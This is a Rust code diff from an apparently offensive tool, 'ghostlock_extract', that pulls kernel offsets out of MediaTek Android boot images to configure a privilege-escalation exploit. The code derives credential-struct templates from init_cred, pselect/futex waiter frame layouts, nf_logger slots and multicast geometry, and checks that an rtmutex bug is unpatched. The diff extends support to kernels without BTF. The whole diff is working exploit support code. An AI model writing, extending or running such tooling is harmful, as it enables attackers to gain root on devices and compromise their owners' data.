@@ -9,7 +9,8 @@ use ghostlock_extract::analysis;
 use ghostlock_extract::boot::{BootImage, MTK_DEFAULT_PHYS_LOAD, MTK_VADDR_BASE};
 use ghostlock_extract::btf::Btf;
 use ghostlock_extract::derive::{
-    PSELECT_ROUTE_NFDS, derive_cred_5x, derive_nf_logger_registration, derive_pselect_layout,
+    CRED_5X_SIZE, Cred5x, PSELECT_ROUTE_NFDS, derive_cred_5x, derive_cred_5x_without_btf,
+    derive_mm_stride, derive_nf_logger_registration, derive_pselect_layout,
     ensure_rtmutex_43499_unpatched, multicast_waiter_off, relative_symbols,
 };
 use ghostlock_extract::error::{ExtractError, Result};
@@ -21,7 +22,8 @@ use ghostlock_extract::kallsyms_finder;
 use ghostlock_extract::payload;
 use ghostlock_extract::report;
 use ghostlock_extract::symbols::{
-    kernel_layout_verified, kernel_struct_macro, resolve_structs, resolve_symbols,
+    STRUCT_DEFAULTS_5_10, fill_struct_defaults, kernel_layout_verified, kernel_struct_macro,
+    resolve_structs, resolve_symbols,
 };
 use ghostlock_extract::vendor_boot::recover_kernel_phys_from_vendor_boot;
 
@@ -442,50 +444,52 @@ fn run(cli: &Cli) -> Result<i32> {
     // recorded here and re-checked after route selection instead of aborting.
     let mut pselect_infeasible: Option<String> = None;
     if !cli.no_disasm {
-        if let Some(btf) = &btf {
-            match derive_pselect_layout(
-                &boot.kernel,
-                &rel_symbols,
-                &sorted_offsets,
-                btf,
-                PSELECT_ROUTE_NFDS,
-            ) {
-                Ok(layout) => {
-                    let shift = layout.shift as i64 - 2;
-                    let frame_parts: Vec<String> = [
-                        "frame_pselect_wrapper",
-                        "frame_pselect_dispatch",
-                        "frame_pselect_core",
-                        "frame_futex_wrapper",
-                        "frame_futex_dispatch",
-                        "frame_futex_wait",
-                    ]
-                    .iter()
-                    .filter_map(|key| {
-                        layout.frames.get(*key).map(|value| {
-                            format!("{}={:#x}", key.split('_').nth(1).unwrap_or(key), value)
-                        })
+        // pselect needs no BTF: its frames and the futex waiter come from the
+        // disassembly alone, which is what makes a BTF-less image usable.
+        match derive_pselect_layout(
+            &boot.kernel,
+            &rel_symbols,
+            &sorted_offsets,
+            btf.as_ref(),
+            PSELECT_ROUTE_NFDS,
+        ) {
+            Ok(layout) => {
+                let shift = layout.shift as i64 - 2;
+                let frame_parts: Vec<String> = [
+                    "frame_pselect_wrapper",
+                    "frame_pselect_dispatch",
+                    "frame_pselect_core",
+                    "frame_futex_wrapper",
+                    "frame_futex_dispatch",
+                    "frame_futex_wait",
+                ]
+                .iter()
+                .filter_map(|key| {
+                    layout.frames.get(*key).map(|value| {
+                        format!("{}={:#x}", key.split('_').nth(1).unwrap_or(key), value)
                     })
-                    .collect();
-                    eprintln!(
-                        "info: pselect chain {} frames={} buffer={:#x} waiter={:#x} \
-                         shift={shift} (derived {} - 2)",
-                        layout.chain,
-                        frame_parts.join(" "),
-                        layout.pselect_buffer,
-                        layout.waiter_local,
-                        layout.shift,
-                    );
-                    derived.insert("pselect_waiter_shift_value".to_string(), shift as u64);
-                }
-                Err(ExtractError::Infeasible(message)) => {
-                    eprintln!("warning: pselect route not feasible on this kernel: {message}");
-                    pselect_infeasible = Some(message);
-                }
-                Err(err) => {
-                    eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
-                }
+                })
+                .collect();
+                eprintln!(
+                    "info: pselect chain {} frames={} buffer={:#x} waiter={:#x} \
+                     shift={shift} (derived {} - 2)",
+                    layout.chain,
+                    frame_parts.join(" "),
+                    layout.pselect_buffer,
+                    layout.waiter_local,
+                    layout.shift,
+                );
+                derived.insert("pselect_waiter_shift_value".to_string(), shift as u64);
             }
+            Err(ExtractError::Infeasible(message)) => {
+                eprintln!("warning: pselect route not feasible on this kernel: {message}");
+                pselect_infeasible = Some(message);
+            }
+            Err(err) => {
+                eprintln!("warning: pselect_waiter_shift derivation failed: {err}");
+            }
+        }
+        if let Some(btf) = &btf {
             match derive_nf_logger_registration(&boot.kernel, &rel_symbols, &sorted_offsets, btf) {
                 Ok(info) => {
                     derived.insert("off_slide_loggers_0_1".to_string(), info.loggers_0_1);
@@ -499,7 +503,10 @@ fn run(cli: &Cli) -> Result<i32> {
                 }
             }
         } else {
-            eprintln!("warning: no BTF; loggers_0_1 falls back to the loggers+0x10 heuristic");
+            eprintln!(
+                "info: no BTF; loggers_0_1 uses the fixed loggers[0][NF_LOG_TYPE_ULOG] \
+                 index (loggers + 8)"
+            );
         }
     } else {
         eprintln!(
@@ -535,7 +542,20 @@ fn run(cli: &Cli) -> Result<i32> {
     if let Some(slot) = derived.get("off_slide_loggers_0_1").copied() {
         symbol_offsets.insert("off_slide_loggers_0_1".to_string(), Some(slot));
     }
-    let struct_offsets = resolve_structs(btf.as_ref());
+    let mut struct_offsets = resolve_structs(btf.as_ref());
+    if btf.is_none()
+        && kernel_layout_verified(release.as_deref())
+        && kernel_struct_macro(release.as_deref()) == Some("STRUCT_OFFSETS_5_10")
+    {
+        /* A BTF-less 5.10 image still gets the family layout the reference BTF
+         * carries, so the conf is complete without a built-in profile. */
+        fill_struct_defaults(&mut struct_offsets, STRUCT_DEFAULTS_5_10);
+    }
+    let mm_stride = if cli.no_disasm {
+        None
+    } else {
+        derive_mm_stride(&boot.kernel, &rel_symbols, &sorted_offsets)
+    };
 
     let missing: Vec<String> = symbol_offsets
         .iter()
@@ -598,14 +618,61 @@ fn run(cli: &Cli) -> Result<i32> {
     }
 
     let btf_size = btf_raw.as_ref().map(|b| b.len()).unwrap_or(0);
+    let major = release
+        .as_deref()
+        .and_then(|release| release.split('.').next())
+        .and_then(|part| part.parse::<u32>().ok());
+    /* The credential template is shared by the conf and JSON outputs. Without
+     * BTF, a verified 5.10 image still gets it from its own init_cred. */
+    let derived_cred: Option<(Cred5x, u32)> = if major == Some(5) {
+        btf.as_ref()
+            .and_then(|btf| {
+                let init_cred_off = symbol_offsets.get("off_init_cred").copied().flatten()?;
+                let size = btf.size("cred")?;
+                match derive_cred_5x(btf, &boot.kernel, init_cred_off) {
+                    Ok(cred) => Some((cred, size)),
+                    Err(err) => {
+                        eprintln!("warning: 5.x credential derivation failed: {err}");
+                        None
+                    }
+                }
+            })
+            .or_else(|| {
+                /* No BTF: the 5.10 cred layout and the image's init_cred still
+                 * give the complete template. `init_groups` starts immediately
+                 * after init_cred and supplies the size. */
+                if !kernel_layout_verified(release.as_deref())
+                    || kernel_struct_macro(release.as_deref()) != Some("STRUCT_OFFSETS_5_10")
+                {
+                    return None;
+                }
+                let init_cred_off = symbol_offsets.get("off_init_cred").copied().flatten()?;
+                let cred_size = kallsyms::unique(&symbols, "init_groups")
+                    .and_then(|value| value.checked_sub(base))
+                    .and_then(|init_groups| init_groups.checked_sub(init_cred_off))
+                    .filter(|size| (0x80..=0x200).contains(size) && size % 8 == 0)
+                    .map(|size| size as u32)
+                    .unwrap_or(CRED_5X_SIZE);
+                match derive_cred_5x_without_btf(&boot.kernel, init_cred_off, cred_size) {
+                    Ok(cred) => Some((cred, cred_size)),
+                    Err(err) => {
+                        eprintln!("warning: 5.x credential derivation failed without BTF: {err}");
+                        None
+                    }
+                }
+            })
+    } else {
+        None
+    };
+    if major == Some(5) && derived_cred.is_none() {
+        eprintln!(
+            "warning: credential template omitted; the built-in profile must supply it"
+        );
+    }
     let output = if cli.format == "conf" {
         let release_text = release
             .as_deref()
             .ok_or_else(|| ExtractError::new("--format conf requires a kernel release string"))?;
-        let major = release_text
-            .split('.')
-            .next()
-            .and_then(|part| part.parse::<u32>().ok());
         if major != Some(5) && major != Some(6) {
             return Err(ExtractError::new(format!(
                 "--format conf needs a 5.x/6.x release, got {release_text}"
@@ -673,6 +740,13 @@ fn run(cli: &Cli) -> Result<i32> {
                      keeping the proven 5.x constant"
                 ),
             }
+            if !report::multicast_geometry_fits(&geometry) {
+                eprintln!(
+                    "error: the derived multicast stamp does not fit the option buffer; \
+                     this kernel has no usable multicast branch"
+                );
+                geometry.clear();
+            }
         }
         match route.as_deref() {
             Some(route) if geometry.is_empty() => eprintln!(
@@ -694,31 +768,14 @@ fn run(cli: &Cli) -> Result<i32> {
             );
         }
         eprintln!(
-            "info: {release_text} profile is an unverified candidate; the app validates fields \
-             before any execution"
+            "info: {release_text} candidate profile; the app validates fields before any \
+             execution"
         );
         let cred: Vec<(String, String)> = if major == Some(5) {
-            let derived_cred = btf.as_ref().and_then(|btf| {
-                let init_cred_off = symbol_offsets.get("off_init_cred").copied().flatten()?;
-                let size = btf.size("cred")?;
-                match derive_cred_5x(btf, &boot.kernel, init_cred_off) {
-                    Ok(cred) => Some(report::conf_cred_5x(&cred, size)),
-                    Err(err) => {
-                        eprintln!("warning: 5.x credential derivation failed: {err}");
-                        None
-                    }
-                }
-            });
-            match derived_cred {
-                Some(cred) => cred,
-                None => {
-                    eprintln!(
-                        "warning: credential template omitted; the built-in profile must \
-                         supply it"
-                    );
-                    Vec::new()
-                }
-            }
+            derived_cred
+                .as_ref()
+                .map(|(cred, size)| report::conf_cred_5x(cred, *size))
+                .unwrap_or_default()
         } else {
             report::conf_cred_6x()
         };
@@ -738,9 +795,10 @@ fn run(cli: &Cli) -> Result<i32> {
             route_geometry: &geometry,
             cred: &cred,
             extra_offsets: &extra_offsets,
+            mm_stride,
         })
     } else {
-        let report_value = report::build_report(
+        let mut report_value = report::build_report(
             release.as_deref(),
             base,
             kernel_phys_load,
@@ -748,7 +806,11 @@ fn run(cli: &Cli) -> Result<i32> {
             &struct_offsets,
             btf_size,
             pselect_shift,
+            mm_stride,
         );
+        if let Some((cred, size)) = &derived_cred {
+            report_value["cred"] = report::cred_json(cred, *size);
+        }
         serde_json::to_string_pretty(&report_value).unwrap() + "\n"
     };
     if let Some(out) = &cli.out {
@@ -756,6 +818,9 @@ fn run(cli: &Cli) -> Result<i32> {
     } else {
         print!("{output}");
     }
+    let flat_waiter = btf.is_none()
+        && kernel_layout_verified(release.as_deref())
+        && kernel_struct_macro(release.as_deref()) == Some("STRUCT_OFFSETS_5_10");
     let remaining: Vec<String> = symbol_offsets
         .iter()
         .map(|(key, value)| (key.clone(), value.map(|v| v as u64)))
@@ -764,7 +829,12 @@ fn run(cli: &Cli) -> Result<i32> {
                 .iter()
                 .map(|(key, value)| (key.clone(), value.map(|v| v as u64))),
         )
-        .filter(|(_, value)| value.is_none())
+        .filter(|(key, value)| {
+            value.is_none()
+                && !(flat_waiter
+                    && (key.as_str() == "waiter_wake_state"
+                        || key.as_str() == "waiter_ww_ctx"))
+        })
         .map(|(key, _)| key.clone())
         .collect();
     if !remaining.is_empty() {
